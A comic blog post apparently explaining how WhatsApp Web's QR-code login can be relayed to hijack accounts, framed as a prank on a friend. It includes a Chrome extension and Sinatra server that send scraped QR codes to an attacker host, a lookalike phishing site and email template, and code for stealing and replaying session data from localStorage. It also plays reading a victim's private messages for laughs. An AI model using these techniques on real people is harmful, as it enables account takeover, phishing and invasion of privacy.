---
layout: post
title: A tale of love, betrayal, social engineering and Whatsapp
published: false
tags: [Security]
---
You are fed up with with your dear friend and bitter rival, Steve Steveington. He claims to have no idea how all your D&D characters came to be renamed "Sir Doofus McGoofus \<obscene drawing\>", but your instincts tell you that he probably actually does. Two weeks ago at a pie-eating contest, he met what he has been incessantly describing as "Agatha, woman of my dreams". He has been WhatsApp-ing her constantly, and has been a picture of smug, stupid-faced douchbaggery. You are of course very happy for him. But, at the same time, you know that would be much happier if you destroyed his life.

You need to get access to his WhatsApp account.
<p style='text-align: center;'>
  <img src="/images/whatsappheader.jpg" />
</p>

## Act 0: Research montage

Having learned from your [previous capers inside his Tinder account](http://robertheaton.com/2014/12/08/fun-with-your-friends-facebook-and-tinder-session-tokens), Steve now keeps all of his devices locked, password-protected, under armed guard, and otherwise extremely inaccessible. You’re not going to be able to install any snooping software or get even a second alone with any of his machines. You start doing some research. You find that WhatsApp recently rolled out end-to-end encryption using the [Whisper Protocol](https://whispersystems.org/blog/whatsapp-complete/). Not even they can read Steve Steveington’s messages. You start reading the research papers describing the protocol, but they look way hard. You figure that you could probably break it given three weeks, a team of unpaid interns and a sturdy piece of two-by-four, but you’re not sure that you have that long before his tales of Agatha make you go completely insane. You are instead going to have to rely on your keen understanding of the interplay between technology and the human psyche.

The sturdy piece of two-by-four can be your backup.

You settle down onto your end of the couch with your laptop and your phone. As usual, Steve is sitting at his end, WhatsApping with Agatha and eating a grotesquely oversized peanut butter sandwich. God you really hate that guy.

You notice that WhatsApp recently released [WhatsApp Web](https://web.whatsapp.com/) to allow you to use WhatsApp from your laptop browser. The authentication mechanism is very elegant. You go to web.whatsapp.com on your laptop. This page has a QR code that you scan with the WhatsApp app on your phone. This tells the WhatsApp server that you trust the laptop that is displaying this QR code, and you are logged into WhatsApp on this laptop automatically.
<p style='text-align: center;'>
  <img src="/images/whatsapp1.jpg" />
</p>
You figure that the WhatsApp server probably generates a unique ID of some kind, and then A) sends it to your laptop and B) stores it for later. Your laptop turns this ID into a QR code. Then when you scan the QR code using WhatsApp on your phone, you are effectively saying to the WhatsApp servers "hey, please log me in on the laptop that has the unique ID contained in this QR code."

Because of WhatsApp’s end-to-end encryption, your laptop then actually retrieves your messages directly from your phone, not from any central WhatsApp servers. WhatsApp does not centrally store your messages anywhere. They are saved only on the devices of WhatsApp users. You assume that your laptop generates some kind of public/private key pair and sends the public key to your phone. Your phone uses this to encrypt your messages, and sends these encrypted messages to your laptop via the WhatsApp servers. Since the encryption was negotiated by your devices directly, no one at WhatsApp has any way of reading the messages passing through their systems, no matter how nicely the FBI asks them. This is why web.whatsapp.com only works when your phone is connected to the internet. It’s probably a little more complex than this, but this feels close enough.
<p style='text-align: center;'>
  <img src="/images/whatsapp2.jpg" />
</p>
This is all interesting to know, but unless you can [Man-In-The-Middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) Steve whilst he’s logging in, it doesn’t directly help you. You are distracted by a wry chuckle and a snort from your friend’s half of the couch. "Agatha just…don’t worry," he quips. You hadn’t asked.

## Act 2: Epiphany

You take a step back. It occurs to you that we are used to using QR codes in the same way we use [HTTP GET-requests](http://blog.teamtreehouse.com/the-definitive-guide-to-get-vs-post). By convention, GET-requests are only used for retrieving information from a server. "Show me my Facebook profile". "Give me the latest stock prices". They don’t "do" anything. They should only be reading and returning what is already there.

By contrast, [HTTP POST-requests](http://blog.teamtreehouse.com/the-definitive-guide-to-get-vs-post) are used to "do" things - send new messages, upload photos, delete accounts. These are all much more dangerous actions that a user should be more cautious about performing, and that a trickster is much more interested in messing with. Unless someone nefarious can also read the response, it’s generally no big deal if a user is tricked into making a GET-request and loading a webpage they didn’t mean to. However, it’s a much bigger deal if a user is tricked into making a POST-request that creates hundreds of messages espousing positive opinions about acai-berry-based viagra.

Maybe you’ve led a sheltered life, but you’ve only ever seen QR codes used on billboards as shortcuts to visiting websites or finding apps in an App Store. These are safe, GET-style requests that are just fetching, rather than mutating data. If you get tricked into scanning the wrong billboard QR code then the worst-case scenario is you see some disturbing but strangely hypnotic content that you check out again later after everyone else has gone to bed. By contrast, the WhatsApp login mechanism uses QR codes for logging in to your account. This is weighty, important, POST-style stuff. If you could trick someone into scanning the QR code on your laptop, you would instantly be logged into their account, with full access to everything.

But whilst Steve Steveington is an idiot and a charlatan, you know that he would be savvy enough to tell you to go to hell if you asked him to scan a QR code on web.whatsapp.com on your laptop.

This is when you have a brainwave. You realize that it doesn’t matter where in the world the QR code on your laptop is scanned. Your laptop could be upstairs and the scanning could take place downstairs. Your laptop could be downstairs and the scanning could take place somewhere in the outskirts of Helsinki. If you can trick someone into scanning even just a copy of the QR code currently active on your laptop, you will be inside their account.

## Act 3: Implantation via agile methodology

This realization gives you a lot more options for trickery. You hatch a plan.

Step 1 is to scrape the web.whatsapp.com QR code from your laptop. You throw together a quick Chrome extension. It scrapes the web.whatsapp.com QR code (an image [encoded as base 64](data:image/png;base64,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) from your browser and sends it to some external server controlled by you. It also listens for updates to the QR code and sends the new image this your server whenever it changes.

Chrome extension content.js:

```javascript
jQuery(document).ready(function() {
  var qrcodeSelector = '.qrcode img';

  jQuery(qrcodeSelector).on('load', function() {
    chrome.runtime.sendMessage({
      src: jQuery(qrcodeSelector).attr('src');,
    });
  });
});
```

and background.js:

```javascript
URL = 'localhost'

chrome.runtime.onMessage.addListener(function(request, sender, callback) {
  jQuery.post(URL, {src: request.src});
});
```

Step 2 is to build something for the Chrome extension to send the QR codes to. You build a tiny Sinatra app that receives and saves new QR codes and displays the latest code at a `/images/latest` endpoint.

```ruby
require 'sinatra'
require 'sinatra/activerecord'
require 'base64'

class Image < ActiveRecord::Base
end

post '/images' do
  response.headers['Access-Control-Allow-Origin'] = 'chrome-extension://ehnemkijgmddcmgmccljkhknondgmfpo'

  Image.create(src: params[:src])
end

get '/images/latest' do
  response.headers['Access-Control-Allow-Origin'] = '*'
  content_type 'image/png'

  src = Image.last.src
  Base64.decode64(src.slice(src.index(',')..-1))
end
```

You deploy it to Heroku and retreat to the privacy of your bedroom to conduct some testing.

You gingerly place your laptop on one side of the room and boot up the server and the Chrome extension. You watch as the QR codes from web.whatsapp.com are sent to your server. You open up https://nothingtoseehere.herokuapp.com/images/latest on your work laptop on the other side of the room. It shows the same QR code as your personal laptop. You pull out your phone, open WhatsApp and scan the QR code from the app open on your work laptop. Your WhatsApp messages appear on your personal laptop on the other side of the room. You let out a bloodcurdling victory yodel.

You spend the rest of the evening apologizing to your neighbors for waking their 4 month-old triplets.

## Act 4: Execution

You now have a portable copy of your QR code that you can open on your phone’s browser or even embed into other websites. In many ways the next and final step is the easiest. In many other ways it is the hardest. You have to trick Steve Steveington into scanning your QR code.

As you already noted, you have a headstart because people generally aren't very scared of QR codes. You register the domain http://whatsappweb.com/. You build a carbon copy of web.whatsapp.com, but displaying the QR code scraped from your laptop instead of one created and sent by Whatsapp.
<p style='text-align: center;'>
  <img src="/images/whatsapp3.jpg" />
</p>
<p style='text-align: center;'>
  <img src="/images/whatsapp4.jpg" />
</p>
Then you wait until your friend has eaten a huge burrito and is thinking even less clearly than normal. You send a carefully crafted phishing email from security@whatsappweb.com to steve@steveington.com. And then you play the waiting game.

```
To: steve@steveington.com
From: security@whatsappweb.com
Subject: Your WhatsApp Account

Dear Steve Steveington,

We are conducting a security review of all of our accounts to protect against
hackers. In order to best protect you from hackers, you must log into your
WhatsApp Web account right now by clicking on __this secure link__. It is
important that you use this secure link to log in, otherwise you will not
be protected from hackers.

Best,

WhatsApp
```

You are each sat in your customary positions on the couch. You have your laptop open, web.whatsapp.com open, and your server and Chrome extension up and running. Out of the corner of your eye you see Steve reach for his phone. Did you get a security email from WhatsApp? he asks. Oh yes, you reply. It was very legit. Very legit indeed. I did it immediately and it made my account much more secure. I was really glad I did that.

You spend a few more minutes describing just how delightful the whole experience was before deciding that discretion might be the order of the day. Your friend looks suspicious; the last time you were this enthusiastic about anything it ended up costing him $150 in dry cleaning and a replacement shower curtain. But in his burrito-addled condition he is in no state to analyze much further. You watch as he blearily points his phone at his laptop screen.

You can see the individual, beautiful bits and bytes flying through the air. You can almost reach out and touch them.

Steve’s messages appear on your screen. You let out another bloodcurdling victory yodel that you try and disguise as a violent cough, with partial success.

## Act 5: Aftermath

You use your coughing fit as an excuse to run upstairs. You read Steve’s recent exchanges with Agatha. They are heartbreaking.

"Hey how are you how was your weekend what are you up to today want to hang out next Tuesday?"<br/>
"Busy sorry"<br/>
"No problem! I’m fine thanks just kicking back with my buddies getting in a few beers. How about Wednesday?"<br/>
"I’ll get back to you"<br/>
"Sounds great! When shall I check in to see if Wednesday works?"

It is for Steve’s own good that you begin to educate Agatha on the kinds of distressingly freaky stuff that you decide he is into.

## Act 6: The future

You decide to build on your hard work, and you extend the Chrome extension that runs on your laptop. Now whenever it gets logged in to someone’s WhatsApp account, it serializes and saves the session data from your browser's localStorage to some other kind of persistent storage. This session data contains the keys that reauthenticate your laptop to WhatsApp when you refresh the page; it’s how "Remember Me" works. This means that in theory if you save the keys for a session with a WhatsApp account, clear localStorage, then later load the keys back into your browser at your leisure, you should be logged in as that account again. This allows you to leave your laptop running and build up a library of sessions for as many WhatsApp accounts as you can trick your way into.

You save the data like so:

```javascript
serializedSessionData = JSON.stringify(JSON.stringify(localStorage));
saveDataSomehow(serializedSessionData);
localStorage.clear();
```

And load it later like so:

```javascript
serializedSessionData = loadDataSomehow(nameOfSucker);
data = JSON.parse(serializedSessionData);
Object.keys(data).forEach(function (k) {
  localStorage.setItem(k, data[k]);
});
```

There are still some kinks to be ironed out with the session juggling. But you’re working on it.

## Act 7: Coda

It turns out that Agatha shares the avant garde interests you described to her on Steve’s behalf. They have been dating for four months now. Steve seems very different. He’s quieter. More distant.

> Illustrations by [Jessamy Hawke](http://jessamyhawke.co.uk)
